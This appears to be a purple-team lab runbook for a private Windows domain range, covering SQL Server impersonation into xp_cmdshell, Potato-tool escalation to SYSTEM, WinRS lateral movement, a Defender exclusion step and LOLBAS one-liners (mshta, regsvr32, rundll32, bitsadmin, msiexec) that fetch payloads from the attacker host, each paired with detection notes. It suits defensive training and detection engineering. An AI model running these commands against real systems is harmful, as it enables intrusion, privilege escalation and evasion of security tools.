# CAMPAIGNS v3 — Phase 3 — Execution (SQL xp_cmdshell + alternatives)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 3 — Execution (WT041/043: SQL xp_cmdshell)


|                         |                                                                                                        |
| ----------------------- | ------------------------------------------------------------------------------------------------------ |
| **Target**              | mbr01 (192.168.77.22) — SQL Server + machine access                                                    |
| **Source of this path** | SQL enumeration: svc_mssql is NOT sysadmin, but analyst_t1 has IMPERSONATE on sa                       |
| **From**                | Kali (192.168.77.60) → mbr01:1433 **or** `ws01` (192.168.77.62) → direct WinRM                        |
| **Starting cred**       | `analyst_t1` (`T13r_An@lyst!`) — discovered via SQL enum + Kerberoast/crack                            |
| **What you earn**       | OS command execution on mbr01 → SeImpersonatePrivilege → SYSTEM via GodPotato                          |
| **Auth method**         | **SQL auth** (no `-windows-auth` flag) — works from non-domain-joined Kali **or** PowerShell/WinRM from `ws01` |


**Step 1 — Enumerate with `analyst_t1` (discover the path):**

> Identity note: `svc_mssql` (`s3rv1c3_MSSQL!`) was Kerberoasted in Phase 2, but SQL enumeration shows it is **not sysadmin**. `analyst_t1` is the account that has `IMPERSONATE` on `sa`. The campaign uses the right credential at each machine — not a single account everywhere.

```bash
# SQL auth from Kali (or from ws01 via WinRM staging) — no -windows-auth flag needed
impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 0 (NOT sysadmin as analyst_t1)
SELECT name FROM sys.server_principals WHERE principal_id IN
  (SELECT grantee_principal_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE');
  -- → analyst_t1 has IMPERSONATE on sa
```

**Automation (run from local host or provisioning):** `attack-matrix/04-automation/linux/campaign-a/T043-impersonate-ws01.sh` stages the PowerShell helper and executes the SQL impersonation from `ws01` as `analyst_t1`.

### WT043 — Impersonate sa → xp_cmdshell

```bash
# SQL auth from Kali
impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
EXECUTE AS LOGIN = 'sa';                            -- → Impersonation successful
SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 1 (sysadmin via sa)
EXEC xp_cmdshell 'whoami';                          -- → nt service\mssql$sqlexpress ✅
```

**PowerShell/WinRM automation from `ws01` as `analyst_t1`:** The helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-impersonate.ps1` connects to `mbr01:1433` using `analyst_t1` SQL credentials, impersonates `sa`, and executes arbitrary commands. The Bash wrapper `T043-impersonate-ws01.sh` stages and runs it from the local host or provisioning via `ws01`.

**Step 2 — Enumerate mbr01 via xp_cmdshell:**

The SQL service account can't query LDAP, but it can run OS commands to map the machine:

```bash
EXEC xp_cmdshell 'net localgroup "Remote Desktop Users"';  -- → CADRE\analyst_cloud
EXEC xp_cmdshell 'net localgroup Administrators';    -- → Administrator, CHILD\Domain Admins, vagrant
EXEC xp_cmdshell 'systeminfo | findstr /B "OS Name"'; -- → Microsoft Windows Server 2025
```

**Finding:** `CADRE\analyst_cloud` has RDP access to mbr01. The SQL service account can't query LDAP, but it can execute OS commands.

**Step 3 — Check privileges via xp_cmdshell:**

```bash
EXEC xp_cmdshell 'whoami /priv';     -- → SeImpersonatePrivilege = Enabled
EXEC xp_cmdshell 'whoami /groups';   -- → BUILTIN\Users (NOT admin)
```


| Privilege                  | State       | Significance                                                   |
| -------------------------- | ----------- | -------------------------------------------------------------- |
| **SeImpersonatePrivilege** | **Enabled** | **Potato attack vector — impersonate any token on the system** |
| SeChangeNotifyPrivilege    | Enabled     | Bypass traverse checking                                       |
| SeCreateGlobalPrivilege    | Enabled     | Create global objects                                          |


**Critical finding:** SeImpersonatePrivilege on a service account = local privilege escalation via Potato attacks (GodPotato, PrintSpoofer, RoguePotato). No reverse shell needed — all commands run through xp_cmdshell.

---

### Local Privilege Escalation: Potato-family alternatives → SYSTEM (mbr01)


|                         |                                                                   |
| ----------------------- | ----------------------------------------------------------------- |
| **Target**              | mbr01 (192.168.77.22)                                             |
| **Source of this path** | Phase 3: `nt service\mssql$sqlexpress` has SeImpersonatePrivilege |
| **Tool staging**        | `ws01` (initial beachhead) → `C$` / `ADMIN$` on mbr01               |
| **What you earn**       | `nt authority\system` on mbr01 — full control of the machine      |


**Why this matters (CRTP/CAPE method):** Real attackers do not download binaries directly onto the target from their C2 HTTP server. They stage tools on the first compromised host (`ws01`), then copy them laterally over SMB (`xcopy`, `Copy-Item`, `net use`) or PowerShell remoting. This keeps C2-to-DC traffic low and blends the tool transfer with normal Windows admin activity.

**MITRE mapping:** T1570 (Lateral Tool Transfer) · T1068 (Exploitation for Privilege Escalation) · T1078 (Valid Accounts).

**DFIR visibility:** Security 4624/4648, Sysmon EID 1/11 (file creation on target), Zeek `smb.log` `C$`/`ADMIN$` access, Windows 5145/5140, WinRM 91/93.

**Step 1 — Stage LPE binaries on `ws01` (beachhead):**

```powershell
# Run from ws01 as analyst_t1
$dir = "C:\Tools\ADTools"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# GodPotato (DCOM-based, Server 2025 compatible)
Invoke-WebRequest -Uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -OutFile "$dir\GodPotato-NET4.exe" -UseBasicParsing
# PrintSpoofer (named pipe, usually patched on Server 2025)
Invoke-WebRequest -Uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -OutFile "$dir\PrintSpoofer64.exe" -UseBasicParsing
# SweetPotato (multi-method: DCOM, BITS, WinRM, EfsRpc, PrintSpoofer)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe" -OutFile "$dir\SweetPotato.exe" -UseBasicParsing
# JuicyPotatoNG (second-gen DCOM reflection)
Invoke-WebRequest -Uri "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip" -OutFile "$dir\JuicyPotatoNG.zip" -UseBasicParsing
Expand-Archive -Force "$dir\JuicyPotatoNG.zip" "$dir"
```

**Step 2 — Copy from `ws01` to `mbr01` via SMB (T1570):**

```powershell
# From ws01 as analyst_t1 (child.cadre.local\analyst_t1 / T13r_An@lyst!)
$source = "C:\Tools\ADTools"
$target = "\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools"
$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
New-Item -ItemType Directory -Path $target -Force | Out-Null
Copy-Item -Path "$source\GodPotato-NET4.exe" -Destination $target -Force -Credential $cred
Copy-Item -Path "$source\PrintSpoofer64.exe" -Destination $target -Force -Credential $cred
Copy-Item -Path "$source\SweetPotato.exe" -Destination $target -Force -Credential $cred
Get-ChildItem -Path "$target\*.exe" | Select-Object Name, Length
```

**Step 3 — Try LPE alternatives until one returns SYSTEM:**

```powershell
# Via xp_cmdshell from Kali → mbr01 (now that binaries are already on mbr01 from ws01)
EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c whoami"';
# -- → nt authority\system ✅

# If GodPotato fails in the SQL service context, try SweetPotato (auto-selects DCOM/BITS/WinRM/EfsRpc)
EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\SweetPotato.exe -p cmd.exe -a "/c whoami"';

# Or JuicyPotatoNG with brute-force create-process flags
EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"';

# PrintSpoofer is least likely on Server 2025 but kept as a fallback
EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\PrintSpoofer64.exe -i -c cmd /c whoami';
```

**Automation:** `attack-matrix/04-automation/linux/campaign-a/T043-lpe-alternatives-ws01.sh` stages the binaries and tries each candidate via `winrs` from `ws01` to `mbr01`. **Verified path:** `GodPotato.exe` staged from `ws01` to `C:\Windows\Temp\cadre-tools` on `mbr01` returns `nt authority\system` when invoked through the SQL `xp_cmdshell` channel. The reusable helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-system-exec.ps1` runs an arbitrary PowerShell script block as SYSTEM on `mbr01` via this verified SQL → GodPotato channel.

**Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via the `xp_cmdshell` chain: `EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\<tool>.exe -cmd "cmd /c <COMMAND>"'`.

**Notes:**
- `GodPotato` ✅ uses DCOM, generally works on Server 2025 when SeImpersonatePrivilege is present.
- `PrintSpoofer` ❌ usually fails on Server 2025 because the Print Spooler named pipe path is patched.
- `SweetPotato` / `JuicyPotatoNG` are the best alternatives when the execution context (SQL service, WinRM `wsmprovhost`) has `SeImpersonatePrivilege` but a constrained token breaks GodPotato.
- If **all** Potato variants fail, enable missing privileges with `FullPowers` or switch to `KrbRelayUp` (Kerberos relay LPE, no SeImpersonate needed).

> **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.

> **Verified helper chain:** `T043-impersonate-ws01.sh` → `campaign-a-t043-impersonate.ps1` → `campaign-a-t043-system-exec.ps1` → `nt authority\system` on `mbr01` via SQL auth as `analyst_t1`. This chain is the primary execution engine for all subsequent SYSTEM-level actions on `mbr01` in the current campaign run.

---

### Phase 3.5 — Lateral Movement: WinRS from ws01 to mbr01 (T101)


||                         |                                                                   |
|| ----------------------- | ----------------------------------------------------------------- |
|| **Target**              | mbr01 (192.168.77.22)                                             |
|| **Source of this path** | analyst_t1 is a member of `Remote Management Users` on mbr01     |
|| **From**                | ws01 (192.168.77.62) compromised workstation                        |
|| **What you earn**       | Interactive shell on mbr01 as `child\analyst_t1`                   |
|| **MITRE**               | T1021.006 (Remote Services: Windows Remote Management)            |


In a real-world breach, the operator does **not** run every attack from the initial Kali box. After gaining a foothold on the workstation, the next step is to move laterally to a server that holds more valuable credentials or access paths. `mbr01` is the perfect next hop: it hosts MSSQL, IIS, and is not protected by SMB signing.

**Prerequisites (playbook updates applied):**
- `analyst_t1` added to `Remote Management Users` local group on mbr01 (`06-member-services.yml`).
- `ws01` TrustedHosts includes `mbr01.child.cadre.local` and `192.168.77.22` (`17-ws01-deploy.yml`).

**Step 1 — Verify reachability from ws01:**

```powershell
# Run as child.cadre.local\analyst_t1 on ws01
Test-NetConnection -ComputerName mbr01.child.cadre.local -Port 5985
# TcpTestSucceeded : True
```

**Step 2 — Execute remote command via WinRS:**

```bash
# From provisioning .60 via ws01-exec harness
bash ~/CADRE/attack-matrix/04-automation/linux/campaign-a/T101-winrs-pivot-ws01.sh
# Expected: WINRS_OK: reached mbr01 from ws01
#           mbr01
#           User Name         SID
#           ================  =============================================
#           child\analyst_t1  S-1-5-21-2616196951-1941128886-767624593-1114
```

**Step 3 — Optional interactive shell:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! cmd
# Now running cmd.exe on mbr01 as child\analyst_t1
```

**Why this matters:** A workstation account cannot DCSync a DC directly, but it can remote-manage a member server like `mbr01`. That member server can then coerce or abuse a DC, teaching the identity/context boundary between a low-privilege beachhead and a tiered target.

**Detection:**
- Sysmon EID 1 (`winrs.exe` / `wsmprovhost.exe`) on ws01 and mbr01.
- WinSec 4624 Logon Type 3 + 4648 on mbr01.
- Zeek conn.log / Suricata: TCP/5985 between ws01 and mbr01.
- Elastic EQL: `process where process.name == "wsmprovhost.exe" and user.domain != "WS01$"`.

**Fallback if WinRS blocked:** Use `PsExec` over SMB (`psexec \\mbr01 -u child\analyst_t1 -p T13r_An@lyst! cmd`) or PowerShell remoting with `-Authentication Negotiate`.

### Phase 3 — Alternative Execution Techniques ⏳

The following techniques are pending testing. They expand Phase 3 beyond xp_cmdshell → GodPotato → SYSTEM.

#### WinGet Proxy Execution (T1218) ⏳

**Source:** iPurple.team (2026-06-09)

WinGet (Windows Package Manager) is Microsoft-signed and installed by default on Server 2022+. Can proxy execution, download payloads, and bypass application allowlisting.

```bash
# Via xp_cmdshell as SYSTEM
EXEC xp_cmdshell 'winget install --id attacker.package --source winget --silent';
# Or use --override for arbitrary command execution
EXEC xp_cmdshell 'winget install --id Python.Python.3.12 --override "/quiet /norestart"';
```

**Test:** Can WinGet download and execute from attacker HTTP server? Does Sysmon EID 1 capture winget.exe process creation?

**Detection:** Sysmon EID 1 (winget.exe), EID 11 (file write from winget), network to external package source.

#### GAC Hijacking (.NET Assembly Injection) (T1574.001) ⏳

**Source:** iPurple.team (2026-02-10)

Global Assembly Cache (GAC) is a .NET system-wide repository. Hijacking GAC assemblies allows code execution in context of any .NET application. CADRE has MSSQL with CLR integration enabled on mbr02.

```bash
# Via xp_cmdshell — replace legitimate .NET assembly in GAC
# Target: %windir%\Microsoft.NET\assembly\GAC_MSIL\
```

**Test:** Can we inject a malicious assembly into the GAC on mbr02? Does it load in SQL Server's CLR context?

**Detection:** Sysmon EID 11 (file write to `%windir%\Microsoft.NET\assembly\`), EID 7 (image load of unsigned assembly).

#### SQL Server 2025 AI Abuse (T1567, T1218, T1071) ⏳ — Plan 1.1 alt node

**Source:** SpecterOps (2026-06-10)  
**PoC:** [https://github.com/gershsec/mssql2025-poc](https://github.com/gershsec/mssql2025-poc)  
**Study guide:** `study-guide/ref-mssql2025-ai-abuse.md`  
**Graph:** `alt-sql-ai` after mbr02 SQL access (linked server / Branch C adjacency). Re-verify T042 reachability first ([`T042-REVERIFY.md`](../../docs/internal/plan01-telemetry-catalog/plan1.1-campaign-automation/T042-REVERIFY.md)).

mbr02 runs SQL Server 2025 Developer Edition. Three new AI features can be weaponized:


| Technique           | Feature                            | What It Does                                               |
| ------------------- | ---------------------------------- | ---------------------------------------------------------- |
| Data exfil via REST | `sp_invoke_external_rest_endpoint` | POST database contents to attacker HTTPS (100MB chunks)    |
| NTLM coercion       | `CREATE EXTERNAL MODEL` + UNC path | Coerce SQL Server to authenticate to attacker SMB          |
| C2 transport        | `AI_GENERATE_EMBEDDINGS`           | Embedding traffic as C2 channel — looks like legitimate AI |


**Prerequisites:** sysadmin on mbr02, `external rest endpoint enabled`, `external AI runtimes enabled`. Requires playbook update to `09-sql-wsus-verify.yml`.

**Test:** Can we exfiltrate data via REST endpoint? Can we coerce NTLM via UNC path? Does Suricata detect the traffic?

**Detection:** SQL Audit on `CREATE/ALTER/DROP EXTERNAL MODEL`, ERRORLOG on `external rest endpoint enabled`, Suricata HTTPS egress from SQL Server.

#### UACME — UAC Bypass (T1548.002) ⏳

**Source:** RTO-Windows-PrivEsc (Zero Point Security)

UAC bypass from local admin (medium integrity → high integrity). UACME project contains 70+ techniques, many still unfixed on Server 2025. Useful when you have local admin but UAC blocks execution.

**Test:** Can we bypass UAC on mbr01/mbr02 using UACME techniques? Does Sysmon detect the elevation?

**Detection:** Sysmon EID 1 (process creation with elevated integrity), EID 13 (registry modification for UAC bypass).

#### Handle Leak Exploitation (T1134) ⏳

**Source:** RTO-Windows-PrivEsc (Zero Point Security)

Exploit leaked handles from privileged processes. If a SYSTEM process leaks a handle to its token or a privileged object, a lower-privileged process can use that handle to escalate. Kernel-level technique.

**Test:** Can we find leaked handles on mbr01 via xp_cmdshell? Does the technique work alongside GodPotato?

**Detection:** Sysmon EID 10 (process access — handle duplication), EID 1 (process creation with unusual parent).

#### Electron App Backdooring (Loki C2) (T1218, T1036) ⏳

**Source:** White Knight Labs (2026-01-20)
**Tool:** Loki C2 ([https://github.com/boku7/Loki](https://github.com/boku7/Loki))

Replace `resources/app` JS code in signed Electron apps (Teams, Discord, Mailspring) with C2 implant. App is signed → bypasses WDAC, AppLocker, and most EDR. C2 via Azure Blob Storage (`*.blob.core.windows.net`).

**Test:** Install Mailspring on mbr01 → backdoor with Loki C2 → verify C2 connection → verify detection.

**Detection:** Sysmon EID 11 (file create in `resources\app\`), Suricata SID:1000080 (Azure Blob C2), Elastic process creation from Electron app.

#### DCOMIllusionist — Fileless DCOM Lateral Movement (WT108) ⏳

**Source:** Synacktiv (DCOMIllusionist). Fileless DCOM lateral movement via .NET deserialization abuse — no payload on disk. Adopted 2026-08-02 from `Campaign_suggestions.md` upgrade candidates.

```bash
# Stage a .NET deserialization gadget + DCOM activation target (mbr01 from ws01)
# Tooling: DCOMIllusionist PoC / Synacktiv research scripts
```

**Why in campaign:** a distinct lateral vector (DCOM activation) vs the verified WinRM/SQL/coerce paths; fileless.

**Test:** DCOM activation from ws01 → mbr01 as analyst_t1; verify code exec + telemetry.

**Detection:** Sysmon EID 1 (dllhost.exe/scrobj.dll child), EID 10 (DCOM cross-process); Zeek DCOM/RPC.

**Cross-refs:** Phase 3 Alternative Execution; `Campaign_suggestions` DCOMIllusionist.

### Phase 3 — LOLBAS Execution Techniques ⏳

**Source:** LOLBAS Project ([https://lolbas-project.github.io/](https://lolbas-project.github.io/))

The following LOLBAS (Living Off The Land Binaries And Scripts) are available on Server 2025 and can be used for execution, download, and AWL bypass. All are Microsoft-signed binaries.

#### MSBuild.exe — XML Project File Execution (T1127.001) ⏳

```bash
# Via xp_cmdshell — execute C# code via XML project file
EXEC xp_cmdshell 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\payload.xml'
```

**Detection:** Sysmon EID 1 (MSBuild.exe with command-line arguments), EID 11 (XML file creation).

#### mshta.exe — HTA/VBScript Execution (T1218.005) ⏳

```bash
# Via xp_cmdshell — execute remote HTA file
EXEC xp_cmdshell 'mshta.exe http://192.168.77.60:8080/payload.hta'
```

**Detection:** Sysmon EID 1 (mshta.exe with remote URL), EID 3 (network connection from mshta).

#### regsvr32.exe — Scriptlet Execution (T1218.010) ⏳

```bash
# Via xp_cmdshell — execute remote scriptlet
EXEC xp_cmdshell 'regsvr32 /s /n /u /i:http://192.168.77.60:8080/payload.sct scrobj.dll'
```

**Detection:** Sysmon EID 1 (regsvr32.exe with /i flag), EID 3 (network from regsvr32).

#### rundll32.exe — DLL/JS Execution (T1218.011) ⏳

```bash
# Via xp_cmdshell — execute JavaScript
EXEC xp_cmdshell 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://192.168.77.60:8080/payload.sct");o.Exec();'
```

**Detection:** Sysmon EID 1 (rundll32.exe with javascript: argument).

#### bitsadmin.exe — Download + Execute (T1105, T1218) ⏳

```bash
# Via xp_cmdshell — download file
EXEC xp_cmdshell 'bitsadmin /transfer job http://192.168.77.60:8080/payload.exe C:\Users\Public\payload.exe'
```

**Detection:** Sysmon EID 1 (bitsadmin.exe), EID 11 (file write from bitsadmin).

#### InstallUtil.exe — .NET AWL Bypass (T1218.004) ⏳

```bash
# Via xp_cmdshell — execute .NET assembly bypassing AppLocker
EXEC xp_cmdshell 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\payload.dll'
```

**Detection:** Sysmon EID 1 (InstallUtil.exe with /U flag).

#### cmstp.exe — INF Execution + AWL Bypass (T1218.003) ⏳

```bash
# Via xp_cmdshell — execute INF file bypassing UAC
EXEC xp_cmdshell 'cmstp.exe /s C:\Users\Public\payload.inf'
```

**Detection:** Sysmon EID 1 (cmstp.exe with /s flag).

#### msiexec.exe — MSI Execution (T1218.007) ⏳

```bash
# Via xp_cmdshell — execute remote MSI
EXEC xp_cmdshell 'msiexec /q /i http://192.168.77.60:8080/payload.msi'
```

**Detection:** Sysmon EID 1 (msiexec.exe with remote URL), EID 3 (network from msiexec).

**LOLBAS testing notes:**

- All 8 binaries are Microsoft-signed → bypass AppLocker/WDAC in default configs
- Test which ones work via xp_cmdshell (some may require interactive session)
- Compare with existing certutil/WinGet — which is stealthiest?
- Document Sysmon telemetry for each → build detection rules

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-2.md`](CAMPAIGNS-RUNBOOK-2.md) · Next: [`CAMPAIGNS-RUNBOOK-3.5.md`](CAMPAIGNS-RUNBOOK-3.5.md) →
